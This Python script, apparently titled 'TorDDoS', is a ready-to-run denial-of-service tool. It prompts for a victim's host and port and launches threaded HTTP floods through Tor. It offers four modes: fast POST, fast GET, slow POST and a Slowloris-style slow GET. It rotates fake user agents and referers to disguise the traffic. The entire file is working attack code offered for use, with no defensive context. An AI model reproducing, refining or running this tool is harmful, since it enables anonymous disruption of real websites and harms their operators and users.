#!/usr/bin/env python3
#Code By GogoZin with LeeOn123
import socket
import os
import random
import time
import socks
import requests
import ssl
from threading import Thread
from os import system, name

def clear():
	if name == 'nt':
		_ = system('cls')
	else:
		_ = system('clear')

useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
			"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120400;3211507 Firefox/12.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
			"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
			"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
			"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
			]


def fastpost():
	rq = requests.session()
	rq.proxies['https'] = 'socks5h://localhost:9050'
	ip = rq.get('https://api.ipify.org').text
	post_host = "POST / HTTP/1.1\r\nHost: "+ url + "\r\n"
	content = "Content-Type: application/x-www-form-urlencoded\r\n"
	length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
	refer = "Referer: http://"+ip+"\r\n"
	user_agent = "User-Agent: " + random.choice(useragents) + "\r\n"
	accept = "Accept: */*"
	#data = str(random._urandom(16))
	request = post_host + accept + refer + content + user_agent + length + "\r\n"# + data 
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str("127.0.0.1"), int(9050), True)
	s = socks.socksocket()
	while True:
		try:
			s.connect((str(url),int(port)))
			if ((port==443) or (port==8443)):
				s=ssl.wrap_socket(s)
			for x in range(100):
				s.send(str.encode(request))
				time.sleep(5)
				print("\033[0;33;0mTor dos attack ~> "+str(url))
				print("\033[0;31;0mFrom---> "+str(ip)+" Http-post Flooding host!!! ")
			s.close()
		except:
			print("\033[0;34;0mCan't Connect To \033[0;37;0m" + str(url) +" ")
			print("\033[0;33;0mWebsite Maybe Down ...\033[0;37;0m ")
			s.close()
			time.sleep(2)

def fastget():
	rq = requests.session()
	rq.proxies['https'] = 'socks5h://localhost:9050'
	ip = rq.get('https://api.ipify.org').text
	get_host = "GET / HTTP/1.1\r\nHost: " + url + "\r\n"
	connection = "Connection: Keep-Alive\r\n"
	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
	accept = "Accept: */*\r\n"
	referer = "Referer: https://www.google.com/search?q="+url+"\r\n"
	request = get_host + referer + useragent + accept + connection + "\r\n"
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str("127.0.0.1"), int(9050), True)
	s = socks.socksocket()
	while True:
		try:
			s.connect((str(url),int(port)))
			if ((port==443) or (port==8443)):
				s=ssl.wrap_socket(s)
			for x in range(100):
				s.send(str.encode(request))
				time.sleep(5)
				print("\033[0;33;0mTor dos attack ~> "+str(url))
				print("\033[0;31;0mFrom---> "+str(ip)+" Http-post Flooding host!!! ")
			s.close()
		except:
			print("\033[0;34;0mCan't Connect To \033[0;37;0m" + str(url) +" ")
			print("\033[0;33;0mWebsite Maybe Down ...\033[0;37;0m ")
			s.close()
			time.sleep(2)

def slowpost():
	rq = requests.session()
	rq.proxies['https'] = 'socks5h://localhost:9050'
	ip = rq.get('https://api.ipify.org').text
	post_host = "POST / HTTP/1.1\r\nHost: "+ url + "\r\n"
	content = "Content-Type: application/x-www-form-urlencoded\r\n"
	length = "Content-Length: 65535 \r\nConnection: Keep-Alive\r\n"
	refer = "Referer: http://"+ ip + "\r\n"
	user_agent = "User-Agent: " + random.choice(useragents) + "\r\n"
	accept = "Accept: */*"
	#data = str(random._urandom(16))
	request = post_host + accept + refer + content + user_agent + length# + data 
	while True:
		try:
			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str("127.0.0.1"), int(9050), True)
			s = socks.socksocket()
			print("\033[0;33;0mTor dos attack ~> "+str(url))
			print("\033[0;31;0mFrom---> "+str(ip)+" Slow Post Mod Enable ")
			s.connect((str(url),int(port)))
			if ((port==443) or (port==8443)):
				s=ssl.wrap_socket(s)
			s.send(str.encode(request))
			while True:
				try:
					time.sleep(11)
					s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
					print("\033[0;31;0mSlow Post Data ReSend ~>")
				except:
					print("\033[0;31;0m[+]Tor Node may down")
					break
		except:
			print("\033[0;34;0mCan't Connect To \033[0;37;0m" + str(url) +" ")
			print("\033[0;33;0mWebsite Maybe Down ...\033[0;37;0m ")
			s.close()
			time.sleep(1)

def slowget():
	rq = requests.session()
	rq.proxies['https'] = 'socks5h://localhost:9050'
	ip = rq.get('https://api.ipify.org').text
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str("127.0.0.1"), int(9050), True)
	s = socks.socksocket()
	while True:
		s.connect((str(url),int(port)))
		if ((port==443) or (port==8443)):
				s=ssl.wrap_socket(s)
		print("\033[0;33;0mTor dos attack ~> "+str(url))
		print("\033[0;31;0mFrom---> "+str(ip)+" Slow Get Mod Enable ")
		s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))# Slowloris format header
		s.send("User-Agent: {}\r\n".format(random.choice(useragents)).encode("utf-8"))
		s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
		s.send(("Connection:keep-alive").encode("utf-8"))
		print("\033[0;31;0mSent HTTP Header --> "+str(url))
		time.sleep(1)
		while True:
			time.sleep(10)
			s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
			print("Resent HTTP Data to ~> "+str(url))

clear()
print("\033[0;37;0m PLS Run tor service at First!!!")
print('''

#######               ######  ######                
   #     ####  #####  #     # #     #  ####   ####  
   #    #    # #    # #     # #     # #    # #      
   #    #    # #    # #     # #     # #    #  ####  
   #    #    # #####  #     # #     # #    #      # 
   #    #    # #   #  #     # #     # #    # #    # 
   #     ####  #    # ######  ######   ####   ####  
===================================================
                        C0d3d By GogoZin & Lee0n123
===================================================''')
url = str(input("\033[0;32;0mVictim's host/ip : \033[0;37;0m"))
port = int(input("Victim's port : "))
thr = int(input("\033[0;32;0mInput The Threads : \033[0;37;0m"))
mode = str(input("\033[0;32;0mSlow Mod Or Not(fast/slow) : \033[0;37;0m"))
if mode =='fast':
	me = str(input("\033[0;32;0mMethod(post/get) : \033[0;37;0m"))
	if me =='post':
		for x in range(thr):
			th = Thread(target=fastpost)
			th.start()
			time.sleep(1)
	elif me =='get':
		for x in range(thr):
			th = Thread(target=fastget)
			th.start()
			time.sleep(1)
elif mode =='slow':
	me = str(input("\033[0;32;0mMethod(post/get) : \033[0;37;0m"))
	if me =='post':
		for x in range(thr):
			th = Thread(target=slowpost)
			th.start()
			time.sleep(1)
	elif me =='get':
		for x in range(thr):
			th = Thread(target=slowget)
			th.start()
			time.sleep(1)
else:
	print("[!]Error Mode")
	sys.exit()